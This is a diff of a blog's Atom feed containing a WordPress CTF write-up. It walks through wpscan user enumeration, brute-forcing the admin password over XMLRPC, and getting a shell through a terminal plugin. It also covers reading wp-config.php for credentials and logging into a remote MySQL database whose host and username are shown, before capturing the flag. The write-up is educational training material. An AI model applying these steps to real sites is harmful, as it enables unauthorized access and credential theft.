@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="/atom.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2018-08-22T11:59:11+02:00</updated><id>/</id><title type="html">Pxmme</title><subtitle>Cybersec enthusiast.</subtitle><author><name>Pxmme</name></author><entry><title type="html">Nihwk Training CTF - WordPress</title><link href="/2018/08/22/NIHWK-Write-Up-Wordpress/" rel="alternate" type="text/html" title="Nihwk Training CTF - WordPress" /><published>2018-08-22T07:00:00+02:00</published><updated>2018-08-22T07:00:00+02:00</updated><id>/2018/08/22/NIHWK-Write-Up-Wordpress</id><content type="html" xml:base="/2018/08/22/NIHWK-Write-Up-Wordpress/">&lt;!--more--&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="/atom.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2018-08-22T12:01:14+02:00</updated><id>/</id><title type="html">Pxmme</title><subtitle>Cybersec enthusiast.</subtitle><author><name>Pxmme</name></author><entry><title type="html">Nihwk Training CTF - WordPress</title><link href="/2018/08/22/NIHWK-Write-Up-Wordpress/" rel="alternate" type="text/html" title="Nihwk Training CTF - WordPress" /><published>2018-08-22T07:00:00+02:00</published><updated>2018-08-22T07:00:00+02:00</updated><id>/2018/08/22/NIHWK-Write-Up-Wordpress</id><content type="html" xml:base="/2018/08/22/NIHWK-Write-Up-Wordpress/">&lt;!--more--&gt;
 
 &lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;/h2&gt;
 
@@ -28,8 +28,7 @@
 
 &lt;p&gt;Since I do not speak mandarin, chinese or whatever this was, I couldn’t really read posts and see what was said and who posted it. So I asked my bilingual friend WPSCAN to do it for me by enumerating users :&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-wpscan --url http://jordpress.herokuapp.com/ --enumerate u
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wpscan --url http://jordpress.herokuapp.com/ --enumerate u
 
 [+] Enumerating usernames ...
 [+] Identified the following 1 user/s:
@@ -39,7 +38,6 @@ wpscan --url http://jordpress.herokuapp.com/ --enumerate u
     | 1  | admin | 404 Not |
     +----+-------+---------+
 [!] Default first WordPress username 'admin' is still used
-
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -47,8 +45,7 @@ wpscan --url http://jordpress.herokuapp.com/ --enumerate u
 
 &lt;p&gt;Let’s see if we can do something dumb, by bruteforcing the log-in, since XMLRPC was available :&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-[+] Starting the password brute forcer
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Starting the password brute forcer
   [+] [SUCCESS] Login : admin Password : 12345678
 
   Brute Forcing 'admin' Time: 00:00:23
@@ -57,7 +54,6 @@ wpscan --url http://jordpress.herokuapp.com/ --enumerate u
   +----+-------+------+----------+
   |    | admin |      | 12345678 |
   +----+-------+------+----------+
-
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -75,10 +71,8 @@ wpscan --url http://jordpress.herokuapp.com/ --enumerate u
 
 &lt;p&gt;(Thanks to &lt;a href=&quot;https://wordpress.org/plugins/wpterm/&quot;&gt;Jerome Bruandet for this amazing plugin!&lt;/a&gt;)&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-u5412:/app $ id
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;u5412:/app $ id
 uid=5412(u5412) gid=5412(dyno) groups=5412(dyno)
-
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -86,8 +80,7 @@ uid=5412(u5412) gid=5412(dyno) groups=5412(dyno)
 
 &lt;p&gt;I immediately started looking into wp-config.php to gather some credentials.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&amp;lt;?php
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
 /**
  * The base configuration for WordPress
  *
@@ -179,7 +172,6 @@ if ( !defined('ABSPATH') )
 
 /** Sets up WordPress vars and included files. */
 require_once(ABSPATH . 'wp-settings.php');
-
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -187,8 +179,7 @@ require_once(ABSPATH . 'wp-settings.php');
 
 &lt;p&gt;Anyway, I connected to the remote MySQL DB and started looking.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-~# mysql -u b7gqhve5j2viqqwd -p -h y06qcehxdtkegbeb.cbetxkdyhwsb.us-east-1.rds.amazonaws.com -D ado77oc5a8ntg8qf
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~# mysql -u b7gqhve5j2viqqwd -p -h y06qcehxdtkegbeb.cbetxkdyhwsb.us-east-1.rds.amazonaws.com -D ado77oc5a8ntg8qf
 Enter password: 
 Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
@@ -242,7 +233,6 @@ MySQL [ado77oc5a8ntg8qf]&amp;gt; show tables;
 22 rows in set (0.13 sec)
 
 MySQL [ado77oc5a8ntg8qf]&amp;gt;
-
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -260,10 +250,8 @@ MySQL [ado77oc5a8ntg8qf]&amp;gt;
 
 &lt;p&gt;Long story short, there was indeed a stupid dir in /app, with the flag in it.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-u5412:/app/123213fda9fd7a089fd8afdsafdsaffdafda $ cat flag
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;u5412:/app/123213fda9fd7a089fd8afdsafdsaffdafda $ cat flag
 flag{wordpress_1s_vulnerable!!!!!!!}
-
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
